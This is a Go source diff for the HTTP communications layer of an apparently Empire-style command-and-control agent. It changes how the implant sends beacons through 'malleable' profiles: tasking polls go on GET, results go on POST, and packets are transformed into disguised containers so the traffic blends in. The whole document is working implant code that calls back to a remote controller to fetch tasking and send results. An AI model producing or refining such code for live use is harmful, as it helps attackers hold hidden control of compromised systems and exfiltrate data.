@@ -4,12 +4,9 @@ package comms
 
 import (
 	"bytes"
-	"errors"
 	"io"
 	"math/rand"
 	"net/http"
-	"os"
-	"strconv"
 )
 
 // NewMalleableHttpMessageSender wraps NewHttpMessageSender and additionally
@@ -18,8 +15,8 @@ import (
 //
 // Only available under `-tags malleable` — non-malleable builds use
 // NewHttpMessageSender and get a trySendMalleable stub.
-func NewMalleableHttpMessageSender(server string, headers map[string]string, legacyProfile string, malleableB64 string) (*HttpMessageSender, error) {
-	sender := NewHttpMessageSender(server, headers, legacyProfile)
+func NewMalleableHttpMessageSender(server string, headers map[string]string, legacyProfile, malleableB64, sessionCookie string, defaultPage []byte) (*HttpMessageSender, error) {
+	sender := NewHttpMessageSender(server, headers, legacyProfile, sessionCookie, defaultPage)
 	mp, err := ParseMalleableProfile(malleableB64)
 	if err != nil {
 		return nil, err
@@ -31,14 +28,15 @@ func NewMalleableHttpMessageSender(server string, headers map[string]string, leg
 }
 
 // trySendMalleable runs the profile-driven pipeline when a *MalleableProfile
-// is attached. Returns handled=false when there is no profile or the profile
-// is missing the required section — caller then falls through to legacy.
-func (sender *HttpMessageSender) trySendMalleable(routingPacket []byte) (bool, []byte, error) {
+// is attached. Returns handled=false only when no profile is attached, so the
+// caller falls through to legacy; a profile missing a section or container is
+// handled inside sendMalleable, which falls back to sendLegacy itself.
+func (sender *HttpMessageSender) trySendMalleable(kind RequestKind, routingPacket []byte) (bool, []byte, error) {
 	mp, ok := sender.malleable.(*MalleableProfile)
 	if !ok || mp == nil {
 		return false, nil, nil
 	}
-	resp, err := sender.sendMalleable(mp, routingPacket)
+	resp, err := sender.sendMalleable(mp, kind, routingPacket)
 	return true, resp, err
 }
 
@@ -47,31 +45,25 @@ func (sender *HttpMessageSender) trySendMalleable(routingPacket []byte) (bool, [
 // stores it at the configured terminator, executes the request, and reverses
 // the server's output container on the response body / header / etc.
 //
-// Section + container choice mirrors the PS/Python reference agents emitted
-// by http_malleable.py::generate_comms:
-//   - GET section  → client.Metadata  (the only container GET has)
-//   - POST section → client.Output    (Empire convention: the POST routing
-//     packet rides on `output`. The `id` / Metadata slot is a server-side
-//     extract hint only and is ignored by reference agents. Server's
-//     two-part extract concatenates id+output, so placing everything on
-//     output yields `b"" + routing_packet = routing_packet` on the wire.)
-//
-// Size heuristic: small routing packets (< 20 bytes) go through GET (session
-// heartbeat / tasking poll); larger ones go through POST.
-func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, routingPacket []byte) ([]byte, error) {
-	sectionName := "get"
-	if len(routingPacket) > legacyPostThresholdBytes {
-		sectionName = "post"
+// Tasking requests use the get section and its Metadata container (the only
+// one GET has); results use the post section and its Output container, like
+// the PS/Python agents http_malleable.py::generate_comms emits. The post `id`
+// / Metadata slot is a server-side extract hint reference agents ignore: the
+// server concatenates id+output, so everything on output arrives verbatim.
+func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, kind RequestKind, routingPacket []byte) ([]byte, error) {
+	sectionName := "post"
+	if kind == RequestTasking {
+		sectionName = "get"
 	}
 	section, ok := mp.Sections[sectionName]
 	if !ok {
 		// Profile missing the section we need — fall back to legacy so the
 		// agent can still check in.
-		return sender.sendLegacy(routingPacket)
+		return sender.sendLegacy(kind, routingPacket)
 	}
 	client := section.Client
 	if len(client.URIs) == 0 {
-		return sender.sendLegacy(routingPacket)
+		return sender.sendLegacy(kind, routingPacket)
 	}
 
 	verb := client.Verb
@@ -89,7 +81,6 @@ func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, routingPack
 	if client.Body != "" {
 		bodyBytes, decodeErr := decodeTransformValue(client.Body)
 		if decodeErr != nil {
-			sender.MissedCheckins++
 			return nil, decodeErr
 		}
 		if len(bodyBytes) > 0 {
@@ -99,7 +90,6 @@ func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, routingPack
 
 	req, err := http.NewRequest(verb, requestURL, bodyReader)
 	if err != nil {
-		sender.MissedCheckins++
 		return nil, err
 	}
 
@@ -133,44 +123,50 @@ func (sender *HttpMessageSender) sendMalleable(mp *MalleableProfile, routingPack
 		packetContainer = client.Output
 	}
 	if packetContainer == nil {
-		return sender.sendLegacy(routingPacket)
+		return sender.sendLegacy(kind, routingPacket)
 	}
 	transformed, err := packetContainer.Apply(routingPacket)
 	if err != nil {
-		sender.MissedCheckins++
 		return nil, err
 	}
 	if err := StoreTerminator(req, transformed, packetContainer.Terminator); err != nil {
-		sender.MissedCheckins++
 		return nil, err
 	}
 
-	httpClient := &http.Client{}
-	resp, err := httpClient.Do(req)
+	resp, err := sender.httpClient().Do(req)
 	if err != nil {
-		sender.MissedCheckins++
 		return nil, err
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != 200 {
-		sender.MissedCheckins++
-		if resp.StatusCode == 401 {
-			os.Exit(0)
-		}
+	if err := checkStatus(resp.StatusCode); err != nil {
 		// Drain so the connection can be reused.
 		_, _ = io.Copy(io.Discard, resp.Body)
-		return nil, errors.New(strconv.Itoa(resp.StatusCode))
+		return nil, err
 	}
 
 	// Extract + reverse the server output. A nil server output container
 	// means "return raw body" (print / identity).
+	var out []byte
 	if section.Server.Output != nil {
-		rawResponseData, err := ExtractTerminator(resp, section.Server.Output.Terminator, client.URIs)
+		raw, err := ExtractTerminator(resp, section.Server.Output.Terminator, client.URIs)
 		if err != nil {
 			return nil, err
 		}
-		return section.Server.Output.Reverse(rawResponseData)
+		if out, err = section.Server.Output.Reverse(raw); err != nil {
+			return nil, err
+		}
+		// Header/parameter terminators never read the body; drain it so the
+		// connection goes back to the pool.
+		_, _ = io.Copy(io.Discard, resp.Body)
+	} else if out, err = io.ReadAll(resp.Body); err != nil {
+		return nil, err
 	}
-	return io.ReadAll(resp.Body)
+	if len(out) == 0 {
+		// The malleable listener's "no tasking": construct_server with no
+		// output yields empty bytes once the profile's transforms are
+		// reversed, whatever terminator carried them.
+		return nil, nil
+	}
+	return out, nil
 }
